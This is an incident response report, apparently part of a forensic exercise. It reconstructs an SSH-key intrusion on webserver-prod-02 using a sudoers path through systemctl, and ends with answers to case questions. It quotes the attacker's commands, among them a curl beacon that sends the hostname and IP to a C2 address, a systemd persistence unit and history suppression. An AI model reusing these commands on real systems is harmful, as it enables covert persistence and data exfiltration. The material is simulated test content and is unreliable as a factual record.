---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised on **April 14 at 03:17 UTC** via the **deploy** service account. An attacker authenticated from a known C2 server (**185.229.59.103**) using deploy's stolen SSH private key, then leveraged deploy's overly permissive NOPASSWD sudo access to `systemctl` to install a persistent C2 beacon as a systemd service. The attacker suppressed bash history recording — the malicious commands appear only in the auth.log sudo trail.

## Timeline of Attack

| Time (UTC) | Event | Source |
|---|---|---|
| Apr 14 03:17:44 | Attacker logs in as `deploy` from **185.229.59.103** via publickey (RSA SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ) | auth.log:30 |
| Apr 14 03:18:02 | `sudo cat /etc/passwd` — reconnaissance | auth.log:32 |
| Apr 14 03:18:12 | `sudo cp /tmp/update /usr/local/bin/update` — staged a binary | auth.log:35 |
| Apr 14 03:18:17 | `sudo chmod +x /usr/local/bin/update` | auth.log:36 |
| Apr 14 03:18:29 | `sudo tee /etc/systemd/system/system-updater.service` — wrote C2 beacon unit | auth.log:37 |
| Apr 14 03:18:44 | `sudo systemctl daemon-reload` | auth.log:38 |
| Apr 14 03:18:58 | `sudo systemctl enable system-updater.service` — boot persistence | auth.log:39 |
| Apr 14 03:19:03 | `sudo systemctl start system-updater.service` — beacon activated | auth.log:40 |
| Apr 14 03:20:51 | Session closed | auth.log:41 |

Total dwell time: ~3 minutes. The entire intrusion was automated or scripted.

## Findings

### 1. C2 Beacon (CONFIRMED)
A malicious systemd unit `system-updater.service` was installed at `/etc/systemd/system/system-updater.service`. It runs as root and executes:
```
curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
```
It restarts every 600 seconds (`Restart=always`, `RestartSec=600`) and is enabled at boot (`WantedBy=multi-user.target`).

### 2. Known C2 IP (CONFIRMED)
**185.229.59.103** is a known C2 server per IOC lookup (category: c2_server, tags: c2/beacon/simulated, high confidence).

### 3. Privilege Escalation Path (CONFIRMED)
`/etc/sudoers.d/deploy` grants the deploy account `NOPASSWD: /usr/bin/systemctl` with no argument restrictions. This allowed the attacker to install, enable, and start arbitrary systemd services as root without any password.

### 4. Initial Access — Stolen SSH Key (INFERENCE)
The attacker authenticated as `deploy` from the C2 IP using the **same RSA key fingerprint** (SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ) used by legitimate CI sessions from 10.0.1.50. There were zero failed login attempts. The deploy account has two authorized keys (`deploy@ci-runner-1` and `deploy@ci-backup`); one of these private keys was likely compromised.

### 5. Anti-Forensics — History Suppression (INFERENCE)
deploy's `.bash_history` contains 15 commands — all normal CI/CD activity (git, npm, docker). None of the 9 sudo commands from the attack session appear. The attacker likely ran with `HISTFILE=/dev/null` or `unset HISTFILE`.

### 6. Staged Binary
The attacker copied `/tmp/update` to `/usr/local/bin/update` and made it executable. This binary was not available in the filesystem snapshot for analysis but should be treated as malicious.

## Shell History Analysis

Three accounts had shell history files:

| Account | File | Size | Commands | Findings |
|---|---|---|---|---|
| **root** | `/root/.bash_history` | 80 bytes | 4 | Routine admin: `apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f /var/log/nginx/error.log`. No suspicious activity. |
| **deploy** | `/home/deploy/.bash_history` | 264 bytes | 15 | Normal CI/CD: git, npm, curl to npmjs.org, docker, systemctl status. **Does NOT contain the malicious commands** visible in the auth.log sudo trail. |
| **alice** | `/home/alice/.bash_history` | 123 bytes | 6 | Normal log review: `ls`, `cd /var/log`, `tail nginx/access.log`, `journalctl -u nginx`, `systemctl status nginx`. No suspicious activity. |

Note: **bob** has no shell history file on disk despite two SSH logins in the auth log.

## Indicators of Compromise

| IOC | Type | Context |
|---|---|---|
| **185.229.59.103** | IP (C2 server) | SSH login source, C2 beacon destination |
| **185.229.59.103:8443** | IP:Port | C2 beacon endpoint |
| `/etc/systemd/system/system-updater.service` | File (persistence) | Malicious systemd unit |
| `/usr/local/bin/update` | File (malware) | Staged binary, needs analysis |
| `SHA256:aB1cDeFgHiJkLmNoPqRsTuVwXyZ` | SSH key fingerprint | Compromised deploy key |

## Recommendations

1. **Immediately** disable the `system-updater.service` and quarantine `/usr/local/bin/update` for malware analysis
2. **Rotate** all SSH keys for the `deploy` account; revoke both authorized keys and issue new ones
3. **Restrict** the deploy sudoers entry — add explicit argument constraints (e.g., only `systemctl restart nginx`, not bare `systemctl`)
4. **Block** 185.229.59.103 at the firewall
5. **Investigate** the CI runner (10.0.1.50) and backup system where deploy's SSH keys reside for signs of compromise
6. **Audit** `/tmp` for any remaining attacker artifacts

---

## Case Questions

**Case Q1:** I analyzed the shell histories of three accounts: **root**, **deploy**, and **alice**. (Bob had no history file on disk despite having logged in.)

**Case Q2:** Yes — **deploy's** shell history shows what the attacker did, but only *indirectly*. Deploy's `.bash_history` file itself does **not** contain the attack commands (the attacker suppressed history recording). However, the **auth.log sudo trail** for the deploy account fully documents the attacker's actions during the Apr 14 03:17–03:20 session: reconnaissance (`cat /etc/passwd`), staging a binary (`cp /tmp/update /usr/local/bin/update`, `chmod +x`), and installing a persistent C2 beacon systemd service (`tee`, `systemctl daemon-reload`, `enable`, `start`). The absence of these commands from deploy's bash_history is itself evidence of anti-forensic activity. Neither root's nor alice's history shows any attacker activity.